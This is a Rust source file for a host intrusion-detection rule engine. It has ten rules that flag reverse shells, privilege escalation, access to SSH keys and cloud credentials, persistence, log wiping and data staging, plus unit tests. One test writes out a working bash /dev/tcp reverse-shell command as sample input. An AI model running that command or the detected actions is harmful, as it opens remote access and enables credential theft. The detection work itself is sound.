//! Rule engine (port of `labtrace::rules`, LT001–LT010).
//!
//! Single-event detections only; `correlate.rs` is what groups them into
//! incidents using process ancestry and taint confirmation.

use crate::model::{Event, Finding, Severity};

type RuleFn = fn(&Event) -> Option<&'static str>;

struct Rule {
    id: &'static str,
    title: &'static str,
    severity: Severity,
    apply: RuleFn,
}

static RULES: &[Rule] = &[
    Rule {
        id: "LT001",
        title: "Reverse shell pattern in command line",
        severity: Severity::Critical,
        apply: |e| {
            let c = e.cmdline.as_str();
            if !c.contains("sh") {
                return None;
            }
            if ((c.contains("/dev/tcp/") || c.contains("mkfifo") || c.contains("nc -e")
                || c.contains("ncat -e")
                || c.contains("socat EXEC"))
                && c.contains('&'))
                || (c.contains("/dev/tcp/") && c.contains("bash"))
            {
                Some("classic reverse-shell primitives (bash /dev/tcp, mkfifo, nc -e) in argv")
            } else {
                None
            }
        },
    },
    Rule {
        id: "LT002",
        title: "Privilege escalation attempt (sudo/su from non-root session)",
        severity: Severity::High,
        apply: |e| {
            if e.kind == "exec"
                && (e.exe.ends_with("/sudo")
                    || e.exe.ends_with("/su")
                    || e.cmdline.starts_with("sudo "))
                && e.uid != 0
            {
                Some("privilege escalation binary executed by non-root user")
            } else {
                None
            }
        },
    },
    Rule {
        id: "LT003",
        title: "User account created",
        severity: Severity::High,
        apply: |e| {
            if e.kind == "user-add" {
                Some("new local account created")
            } else {
                None
            }
        },
    },
    Rule {
        id: "LT004",
        title: "SSH key material accessed",
        severity: Severity::Medium,
        apply: |e| {
            let t = e.target.to_ascii_lowercase();
            if e.kind == "file"
                && t.contains("/.ssh/")
                && (t.ends_with("id_rsa") || t.ends_with("id_ed25519") || t.contains("authorized_keys"))
            {
                Some("process read private/authorized SSH key material")
            } else {
                None
            }
        },
    },
    Rule {
        id: "LT005",
        title: "Cloud credentials file accessed",
        severity: Severity::Medium,
        apply: |e| {
            let t = e.target.to_ascii_lowercase();
            if e.kind == "file"
                && (t.contains(".aws/credentials") || t.contains(".config/gcloud") || t.contains(".kube/config"))
            {
                Some("cloud provider credential store touched")
            } else {
                None
            }
        },
    },
    Rule {
        id: "LT006",
        title: "Outbound connection to raw IP (no hostname resolution)",
        severity: Severity::Low,
        apply: |e| {
            if e.kind == "net-connect" && e.success {
                let host = e.target.split(':').next().unwrap_or("");
                if !host.is_empty()
                    && host.chars().all(|c| c.is_ascii_digit() || c == '.')
                    && host.contains('.')
                {
                    Some("direct IP connection (bypasses DNS logging)")
                } else {
                    None
                }
            } else {
                None
            }
        },
    },
    Rule {
        id: "LT007",
        title: "Cron/service persistence modified",
        severity: Severity::High,
        apply: |e| {
            let t = e.target.to_ascii_lowercase();
            let c = e.cmdline.to_ascii_lowercase();
            if e.kind == "file"
                && (t.contains("/etc/cron")
                    || t.contains("/etc/systemd/system")
                    || t.contains("/.ssh/authorized_keys"))
            {
                Some("persistence location written")
            } else if e.kind == "exec"
                && (c.contains("crontab") || c.contains("systemctl enable") || c.contains("systemctl link"))
            {
                Some("persistence mechanism registered")
            } else {
                None
            }
        },
    },
    Rule {
        id: "LT008",
        title: "History/log file truncated (anti-forensics)",
        severity: Severity::Medium,
        apply: |e| {
            let c = e.cmdline.to_ascii_lowercase();
            let t = e.target.to_ascii_lowercase();
            if e.kind == "file"
                && (t.contains("/.bash_history") || t.contains("/var/log/"))
                && (c.contains("> ") || c.contains("truncate") || c.contains("shred") || c.contains("echo -n"))
            {
                Some("log or shell history appears truncated/wiped")
            } else {
                None
            }
        },
    },
    Rule {
        id: "LT009",
        title: "Database dump created",
        severity: Severity::Medium,
        apply: |e| {
            let c = e.cmdline.to_ascii_lowercase();
            if e.kind == "exec"
                && (c.contains("mysqldump")
                    || c.contains("pg_dump")
                    || (c.contains("sqlite3") && c.contains(".dump")))
            {
                Some("database dump command executed")
            } else {
                None
            }
        },
    },
    Rule {
        id: "LT010",
        title: "Archive of sensitive scope created",
        severity: Severity::Medium,
        apply: |e| {
            let c = e.cmdline.to_ascii_lowercase();
            if e.kind == "exec"
                && (c.contains("tar ") || c.contains("zip ") || c.contains("7z "))
                && (c.contains(".aws") || c.contains(".ssh") || c.contains("/etc/") || c.contains("home"))
            {
                Some("archive command covers sensitive paths")
            } else {
                None
            }
        },
    },
];

/// Run all rules over the stream; findings in stream order.
pub fn run(events: &[Event]) -> Vec<Finding> {
    let mut out = Vec::new();
    for e in events {
        for r in RULES {
            if let Some(detail) = (r.apply)(e) {
                out.push(Finding {
                    rule_id: r.id,
                    title: r.title,
                    severity: r.severity,
                    seq: e.seq,
                    pid: e.pid,
                    exe: e.exe.clone(),
                    detail: detail.into(),
                    taints: Vec::new(),
                });
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ev(seq: u64, pid: u32, kind: &str, exe: &str, target: &str, cmdline: &str, uid: i64) -> Event {
        Event {
            seq,
            pid,
            ppid: 1,
            uid,
            kind: kind.into(),
            exe: exe.into(),
            cmdline: cmdline.into(),
            target: target.into(),
            success: true,
            ..Default::default()
        }
    }

    #[test]
    fn detects_reverse_shell() {
        let evs = vec![ev(1, 10, "exec", "/bin/bash", "", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", 1000)];
        assert!(run(&evs).iter().any(|x| x.rule_id == "LT001"));
    }

    #[test]
    fn detects_key_access() {
        let evs = vec![ev(1, 10, "file", "/bin/cat", "/home/u/.ssh/id_rsa", "cat id_rsa", 1000)];
        assert!(run(&evs).iter().any(|x| x.rule_id == "LT004"));
    }

    #[test]
    fn raw_ip_connection_flagged() {
        let evs = vec![ev(1, 10, "net-connect", "curl", "185.199.108.153:443", "curl", 1000)];
        assert!(run(&evs).iter().any(|x| x.rule_id == "LT006"));
    }

    #[test]
    fn benign_event_silent() {
        let evs = vec![ev(1, 10, "exec", "/usr/bin/ls", "", "ls -la", 1000)];
        assert!(run(&evs).is_empty());
    }

    #[test]
    fn finds_all_ten_ids_exist() {
        assert_eq!(RULES.len(), 10);
    }
}
